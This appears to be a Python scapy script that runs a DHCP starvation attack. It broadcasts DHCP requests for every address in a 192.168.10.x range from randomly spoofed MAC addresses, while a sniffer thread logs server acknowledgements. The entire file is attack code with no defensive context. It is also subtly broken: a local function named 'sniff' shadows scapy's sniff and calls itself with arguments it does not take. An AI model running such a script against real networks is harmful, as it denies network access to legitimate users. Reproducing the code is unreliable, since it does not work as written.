#!/usr/bin/python3

from scapy.all import *
from threading import Thread

def packet_handler(pkt):
    if pkt[DHCP]:
        if(pkt[DHCP].options[0][1]==5):
            print("Acknowledgement Packet Sent.")         
        elif (pkt[DHCP].options[0][1]==6):
            print("Negative Acknowledgement Packet Sent.")
        
def sniff():
    sniff(filter="udp and (port 67 or port 68)",prn=packet_handler,store=0)

def starvation():
    for i in range(0,255):
        req_ip_addr = "192.168.10."+str(i)
        spoof_mac = RandMAC()
        pkt = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")/ IP(src="0.0.0.0", dst="255.255.255.255")/ UDP(sport=68, dport=67)/BOOTP(chaddr=spoof_mac)/DHCP(options=[("message-type", "request"),("requested_addr", req_ip_addr),"end"])
        sendp(pkt)
        print("Trying: "+req_ip_addr)



thread = Thread(target=sniff)
thread.start()
starvation()
thread.join()
print("Script finished")